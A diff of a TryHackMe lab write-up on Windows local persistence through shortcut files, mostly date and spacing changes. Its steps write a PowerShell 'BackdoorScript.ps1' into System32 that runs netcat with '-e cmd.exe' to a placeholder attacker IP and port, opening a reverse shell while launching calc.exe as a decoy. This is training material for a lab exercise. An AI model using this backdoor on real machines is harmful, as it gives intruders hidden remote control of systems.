@@ -3,7 +3,7 @@ Module link: https://tryhackme.com/room/windowslocalpersistence
 
 **Please feel free to point out any errors that you may see in this writeup!**
 
-This writeup was last updated: 07/05/2023
+This writeup was last updated: 07/06/2023
 
 # Shortcut Files
 1. Started up this room's machine
@@ -20,10 +20,15 @@ Copyright (C) Microsoft Corporation. All rights reserved.
 PS C:\Users\Administrator>
 ```
 3.1 `$scriptPath = 'C:\Windows\System32\<SCRIPT NAME>.ps1'`
+
 3.2 `$scriptContent = @"`
+
 3.3 `Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe <MACHINE IP> <PORT NUMBER>"`
+
 3.4 `C:\Windows\System32\calc.exe`
+
 3.5 `"@` 
+
 3.6 `Set-Content -Path $scriptPath -Value $scriptContent`
 ```PowerShell
 PS C:\Users\Administrator> $scriptPath = 'C:\Windows\System32\BackdoorScript.ps1'
